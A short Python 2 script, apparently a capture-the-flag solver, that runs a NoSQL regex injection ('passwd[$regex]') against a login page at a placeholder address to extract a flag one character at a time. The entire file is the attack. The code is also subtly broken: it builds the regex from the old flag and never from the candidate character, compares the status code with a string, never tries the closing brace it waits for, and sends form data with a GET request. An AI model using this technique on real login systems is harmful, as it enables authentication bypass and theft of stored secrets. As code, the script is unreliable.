#coding:utf-8
import requests
import string
# print string.ascii_letters
# print string.digits
flag = "c1ctf{"
payload = string.ascii_letters + string.digits

url = "http://xx.x.x.x/index.php?"
restsrt = True
while restsrt:
    restsrt = False
    for i in payload:
        payloads = flag + i
        post_data = {"username":"admin","passwd[$regex]":flag+".*"}
        #post_data = {"username":"admin","passwd[$regex]":"^"+flag}
        r = requests.get(url = url,data = post_data,allow_redirects = False)
        if r.status_code == "302":
            print payloads
            flag = flag + i
            restsrt =True
            if i == "}":
                exit(0)
            break